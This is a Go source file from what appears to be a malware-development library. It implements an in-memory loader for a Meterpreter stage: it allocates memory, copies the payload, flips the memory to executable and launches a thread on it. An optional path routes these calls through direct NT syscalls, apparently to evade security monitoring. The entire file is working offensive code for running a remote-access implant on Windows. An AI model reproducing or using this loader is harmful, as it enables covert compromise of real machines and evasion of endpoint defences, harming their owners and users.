//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// InjectMeterpreterWindows executes a Meterpreter stage in memory using
// VirtualAlloc + RtlMoveMemory + CreateThread.
//
// When caller is non-nil, security-sensitive calls (VirtualAlloc, VirtualProtect,
// CreateThread) are routed through NT syscalls via the Caller. Pass nil for
// standard WinAPI behavior.
func InjectMeterpreterWindows(stage []byte, caller *wsyscall.Caller) error {
	if len(stage) == 0 {
		return fmt.Errorf("empty stage")
	}

	size := uintptr(len(stage))

	// 1. Allocate RW memory
	var addr uintptr
	if caller != nil {
		currentProcess := ^uintptr(0)
		regionSize := size
		r, err := caller.Call("NtAllocateVirtualMemory",
			currentProcess,
			uintptr(unsafe.Pointer(&addr)),
			0,
			uintptr(unsafe.Pointer(&regionSize)),
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			uintptr(windows.PAGE_READWRITE),
		)
		if r != 0 {
			return fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		var err error
		addr, err = windows.VirtualAlloc(
			0, size,
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			windows.PAGE_READWRITE,
		)
		if err != nil {
			return fmt.Errorf("VirtualAlloc: %w", err)
		}
	}

	// 2. Copy stage to allocated memory (RtlMoveMemory is void — not security-sensitive)
	api.ProcRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&stage[0])), size)

	// 3. Transition to executable after write is complete
	var oldProtect uint32
	if caller != nil {
		currentProcess := ^uintptr(0)
		protectAddr := addr
		protectSize := size
		r, err := caller.Call("NtProtectVirtualMemory",
			currentProcess,
			uintptr(unsafe.Pointer(&protectAddr)),
			uintptr(unsafe.Pointer(&protectSize)),
			uintptr(windows.PAGE_EXECUTE_READ),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if r != 0 {
			return fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
			return fmt.Errorf("VirtualProtect: %w", err)
		}
	}

	// 4. Create thread to execute
	if caller != nil {
		var hThread uintptr
		currentProcess := ^uintptr(0)
		r, err := caller.Call("NtCreateThreadEx",
			uintptr(unsafe.Pointer(&hThread)),
			uintptr(api.ThreadAllAccess),
			0,
			currentProcess,
			addr,
			0,
			0, 0, 0, 0, 0,
		)
		if r != 0 {
			return fmt.Errorf("NtCreateThreadEx: NTSTATUS 0x%X: %w", uint32(r), err)
		}
	} else {
		var threadID uint32
		thread, _, err := api.ProcCreateThread.Call(
			0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&threadID)),
		)
		if thread == 0 {
			return fmt.Errorf("CreateThread: %w", err)
		}
	}

	return nil
}
